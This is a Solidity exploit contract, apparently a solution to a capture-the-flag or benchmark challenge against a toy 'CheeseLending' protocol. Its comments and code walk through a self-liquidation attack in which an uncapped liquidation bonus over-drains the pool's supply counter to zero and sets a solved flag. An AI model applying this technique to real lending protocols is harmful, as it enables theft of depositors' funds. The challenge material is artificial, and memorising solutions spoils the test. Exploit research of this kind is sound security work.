// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.19;

import {CheeseLending} from "targets/cheese_lending/src/CheeseLending.sol";
import {Cheese} from "targets/cheese_lending/src/Cheese.sol";

/// @title CheeseAttack
/// @notice Self-liquidation exploit that drives totalSupplied[gruyere] to zero,
///         breaking invariant_lending in CheeseLending.
///
/// Idea:
///   - Gruyere is the cheap token (price = 1), emmental is expensive (price = 2).
///   - Supply gruyere as collateral, borrow emmental at max LTV.
///   - Wait ~1000 s so interest accrual flips the position underwater.
///   - Self-liquidate. PoolLiquidation computes the bonus-inflated collateral in
///     gruyere — uncapped. When the computed payout exceeds the attacker's
///     userSupplyBalance, the over-drain branch at PoolLiquidation.sol:39-40 zeroes
///     the user's balance, then _settleLiquidation decrements reserves.totalSupplied
///     by the full computed amount (line 58) — more than the user ever supplied.
///     Picking the numbers right drains the counter to exactly 0. totalDebt[gruyere]
///     is already 0 (we never borrow gruyere) so invariant_lending's condition for
///     gruyere becomes (false || false) = false, flipping the flag.
contract CheeseAttack {
    CheeseLending public immutable pool;
    Cheese public immutable gruy;
    Cheese public immutable emm;

    constructor(CheeseLending _pool, Cheese _gruy, Cheese _emm) {
        pool = _pool;
        gruy = _gruy;
        emm = _emm;
        _gruy.approve(address(_pool), type(uint256).max);
        _emm.approve(address(_pool), type(uint256).max);
    }

    /// @notice Supply gruyere as collateral, borrow emmental at sub-max LTV.
    ///         Amounts are chosen by the driver so that after the wait, the
    ///         liquidation's over-drain lands on exactly 0.
    function openPosition(uint256 supplyAmt, uint256 borrowAmt) external {
        pool.supply(address(gruy), supplyAmt);
        pool.borrow(address(emm), borrowAmt);
    }

    /// @notice Self-liquidate: collateralAsset=gruyere, debtAsset=emmental, user=this.
    ///         The protocol doesn't forbid liquidator == user.
    function liquidateSelf(uint256 amount) external {
        pool.liquidate(address(gruy), address(emm), address(this), amount);
    }

    /// @notice After the drain, flip the solved flag.
    function finalize() external {
        pool.solve();
    }
}
